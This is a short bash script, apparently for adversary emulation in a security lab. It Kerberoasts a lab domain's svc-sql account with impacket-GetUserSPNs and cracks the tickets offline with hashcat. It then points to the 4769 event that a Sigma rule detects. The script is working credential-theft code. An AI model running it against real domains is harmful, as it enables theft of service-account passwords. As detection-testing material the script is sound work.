#!/usr/bin/env bash
# T1558.003 — Kerberoasting against the lab's svc-sql account.
# Run from the attacker host (Kali), against the lab domain ONLY.
# Requires: impacket-scripts, hashcat, a valid (even low-priv) domain
# account from the T1566.001 foothold or your lab's initial seed user.
set -euo pipefail

DC_IP="${DC_IP:-192.168.50.10}"
DOMAIN="${DOMAIN:-lab.local}"
DOMAIN_USER="${DOMAIN_USER:?set DOMAIN_USER=domainuser}"
DOMAIN_PASS="${DOMAIN_PASS:?set DOMAIN_PASS=domainpassword}"
OUTFILE="svc-sql.hashes"

echo "[*] $(date -Is) Enumerating SPN accounts and requesting TGS tickets..."
impacket-GetUserSPNs "${DOMAIN}/${DOMAIN_USER}:${DOMAIN_PASS}" \
  -dc-ip "${DC_IP}" -request -outputfile "${OUTFILE}"

echo "[*] $(date -Is) Tickets written to ${OUTFILE}. Cracking offline (mode 13100)..."
hashcat -m 13100 "${OUTFILE}" /usr/share/wordlists/rockyou.txt || true

echo "[+] $(date -Is) Done. Check Sysmon/Wazuh on dc01 for the 4769 TGS request around the"
echo "    'Enumerating SPN accounts' timestamp above — that's the event the Sigma rule targets."
